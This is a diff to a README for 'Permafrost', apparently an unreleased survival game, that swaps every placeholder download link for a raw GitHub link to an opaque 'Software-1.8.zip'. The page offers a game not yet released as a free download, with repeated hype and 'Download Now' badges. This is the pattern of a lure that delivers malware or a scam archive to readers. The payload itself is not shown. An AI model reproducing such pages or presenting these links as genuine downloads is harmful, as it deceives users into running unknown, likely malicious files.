@@ -4,7 +4,7 @@
 
 > One of Steam's most-wishlisted games — a brutally cold co-op survival experience for up to 4 players, blending The Long Dark's atmosphere with deep base-building mechanics.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Residencia4776/permafrost/main/greggle/Software-1.8.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **Late 2026** · Available on **PC (Steam)**.
 
 ### Ready to play / use?
 
-[![Download Permafrost](https://img.shields.io/badge/Download-Permafrost-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Permafrost](https://img.shields.io/badge/Download-Permafrost-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Residencia4776/permafrost/main/greggle/Software-1.8.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://raw.githubusercontent.com/Residencia4776/permafrost/main/greggle/Software-1.8.zip)**
 
 </div>
 
@@ -67,7 +67,7 @@ Permafrost is one of the **most hyped releases of Summer 2026** — trending acr
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://raw.githubusercontent.com/Residencia4776/permafrost/main/greggle/Software-1.8.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -75,7 +75,7 @@ Permafrost is one of the **most hyped releases of Summer 2026** — trending acr
 
 **Don't miss out — Permafrost is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Permafrost-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Permafrost-blue?style=for-the-badge)](https://raw.githubusercontent.com/Residencia4776/permafrost/main/greggle/Software-1.8.zip)
 
 *Permafrost — Late 2026 · PC (Steam)*
 
